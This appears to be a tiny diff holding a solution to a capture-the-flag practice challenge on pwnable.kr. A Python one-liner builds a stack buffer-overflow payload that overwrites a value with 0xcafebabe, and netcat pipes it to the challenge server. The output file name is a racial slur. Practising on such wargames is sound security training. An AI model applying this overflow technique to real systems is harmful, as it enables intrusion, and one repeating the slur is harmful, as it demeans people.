@@ -1,0 +1,3 @@
+python -c "print'A'*52+'\xbe\xba\xfe\xca'" > reallynigga.txt
+
+(cat reallynigga.txt;cat) | nc pwnable.kr 9000
